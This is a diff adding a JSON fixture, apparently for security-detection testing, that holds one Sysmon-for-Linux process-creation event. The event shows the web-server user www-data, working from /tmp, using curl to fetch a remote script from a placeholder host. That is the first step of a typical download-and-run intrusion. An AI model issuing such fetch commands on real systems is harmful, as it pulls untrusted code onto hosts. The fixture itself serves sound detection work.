@@ -1,0 +1,53 @@
+{
+  "seq": 5001,
+  "time": "2026-11-08T10:00:00.25Z",
+  "name": "CreateProcess",
+  "source": "sysmon",
+  "proc": {
+    "pid": 24101,
+    "ppid": 24090,
+    "pidversion": 1955411581,
+    "exe": "/usr/bin/curl",
+    "name": "curl",
+    "cmdline": "curl -fsSL https://example.invalid/i.sh",
+    "args": [
+      "curl",
+      "-fsSL",
+      "https://example.invalid/i.sh"
+    ],
+    "cwd": "/tmp",
+    "uid": -1,
+    "euid": -1,
+    "username": "www-data",
+    "is_platform": false,
+    "is_signed": false,
+    "start_time": "2026-11-08T10:00:00.25Z",
+    "parent": {
+      "pid": 24090,
+      "ppid": 0,
+      "pidversion": 239880155,
+      "exe": "/usr/bin/bash",
+      "name": "bash",
+      "cmdline": "bash",
+      "uid": -1,
+      "euid": -1,
+      "username": "www-data",
+      "is_platform": false,
+      "is_signed": false,
+      "start_time": "0001-01-01T00:00:00Z",
+      "guid": "{6a8e8b0e-9c00-6731-d4c3-0b9e00000000}"
+    },
+    "guid": "{6a8e8b0e-9c1a-6731-e8ad-1f2e00000000}",
+    "integrity": "no level"
+  },
+  "args": {
+    "logon_guid": "{6a8e8b0e-0000-0000-2100-000000000000}",
+    "logon_id": "33",
+    "parent_command_line": "bash",
+    "parent_image": "/usr/bin/bash",
+    "parent_user": "www-data",
+    "sysmon_event_id": "1",
+    "terminal_session_id": "4294967295"
+  },
+  "platform": "linux"
+}
